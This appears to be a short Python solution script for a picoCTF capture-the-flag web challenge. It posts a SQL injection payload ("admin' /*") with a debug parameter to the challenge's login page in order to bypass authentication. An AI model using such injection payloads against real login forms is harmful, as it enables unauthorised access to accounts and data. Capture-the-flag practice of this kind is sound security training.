import requests

s = requests.Session()

url = 'https://jupiter.challenges.picoctf.org/problem/53751/login.php'

# setDebugFlagPayload = {
#   'username' : 'test',
#   'password' : 'test',
#   'debug' : '1'
# }

# resp = s.post(url, data=setDebugFlagPayload)
# print(resp.text)

exploit = {
    'username' : """admin' /*""",
    'password' : 'password',
    'debug' : '1'
}

resp = s.post("https://jupiter.challenges.picoctf.org/problem/53751/login.php", data=exploit)
print(resp.text)
